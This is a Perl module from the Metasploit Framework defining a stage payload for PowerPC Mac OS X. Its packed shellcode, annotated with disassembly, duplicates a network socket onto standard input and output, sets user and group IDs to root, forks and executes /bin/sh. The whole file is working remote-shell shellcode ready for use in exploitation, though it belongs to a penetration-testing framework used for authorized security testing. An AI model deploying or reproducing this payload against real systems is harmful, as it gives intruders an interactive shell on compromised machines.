###############
##
#
#    Name: ShellStage.pm
# Version: $Revision$
#  Source: src/shellcode/osx/ppc/stage_tcp_shell.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      dup2
#      setreuid
#      setregid
#      fork
#      execve
#      exit
#
##
###############

package Msf::PayloadComponent::OSX::ppc::ShellStage;

use strict;
use base 'Msf::PayloadComponent::OSX::StagePayload';

my $info =
{
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Priv'         => 0,

    'StagePayload' =>
    {
		# Since this is a stage, we play nice and use all the space we want
		# Socket descriptor is in r30.
        Payload =>
			pack("N*", 
				 0x38a00002,     # 0x1d6c <setup_dup2>:    li      r5,2
				 0x3800005a,     # 0x1d70 <dup2>:          li      r0,90
				 0x7fc3f378,     # 0x1d74 <dup2+4>:        mr      r3,r30
				 0x7ca42b78,     # 0x1d78 <dup2+8>:        mr      r4,r5
				 0x44000002,     # 0x1d7c <dup2+12>:       sc
				 0x7c000278,     # 0x1d80 <dup2+16>:       xor     r0,r0,r0
				 0x38a5ffff,     # 0x1d84 <dup2+20>:       addi    r5,r5,-1
				 0x2c05ffff,     # 0x1d88 <dup2+24>:       cmpwi   r5,-1
				 0x4082ffe5,     # 0x1d8c <dup2+28>:       bnel+   0x1d70 <dup2>
				 0x3800007e,     # 0x1d90 <setreuid>:      li      r0,126
				 0x38600000,     # 0x1d94 <setreuid+4>:    li      r3,0
				 0x38800000,     # 0x1d98 <setreuid+8>:    li      r4,0
				 0x44000002,     # 0x1d9c <setreuid+12>:   sc
				 0x48000019,     # 0x1da0 <setreuid+16>:   bl      0x1db8 <fork>
				 0x3800007f,     # 0x1da4 <setregid>:      li      r0,127
				 0x38600000,     # 0x1da8 <setregid+4>:    li      r3,0
				 0x38800000,     # 0x1dac <setregid+8>:    li      r4,0
				 0x44000002,     # 0x1db0 <setregid+12>:   sc
				 0x7ca52a78,     # 0x1db4 <setregid+16>:   xor     r5,r5,r5
				 0x38000002,     # 0x1db8 <fork>:          li      r0,2
				 0x44000002,     # 0x1dbc <fork+4>:        sc
				 0x48000034,     # 0x1dc0 <fork+8>:        b       0x1df4 <exitproc>
				 0x7ca52a79,     # 0x1dc4 <execsh>:        xor.    r5,r5,r5
				 0x4082fffd,     # 0x1dc8 <execsh+4>:      bnel+   0x1dc4 <execsh>
				 0x7c6802a6,     # 0x1dcc <execsh+8>:      mflr    r3
				 0x38630020,     # 0x1dd0 <execsh+12>:     addi    r3,r3,32
				 0x9061fff8,     # 0x1dd4 <execsh+16>:     stw     r3,-8(r1)
				 0x90a1fffc,     # 0x1dd8 <execsh+20>:     stw     r5,-4(r1)
				 0x3881fff8,     # 0x1ddc <execsh+24>:     addi    r4,r1,-8
				 0x3800003b,     # 0x1de0 <execsh+28>:     li      r0,59
				 0x44000002,     # 0x1de4 <execsh+32>:     sc
				 0x4800000c,     # 0x1de8 <execsh+36>:     b       0x1df4 <exitproc>
				 0x2f62696e,     # 0x1dec <path>:          "/bin"
				 0x2f736800,     # 0x1df0 <path+4>:        "/sh"
				 0x38000001,     # 0x1df4 <exitproc>:      li      r0,1
				 0x38600000,     # 0x1df8 <exitproc+4>:    li      r3,0
				 0x44000002,     # 0x1dfc <exitproc+8>:    sc
				 0x60000000,     # 0x1e00 <exitproc+12>:   nop
				),
    }
};


sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
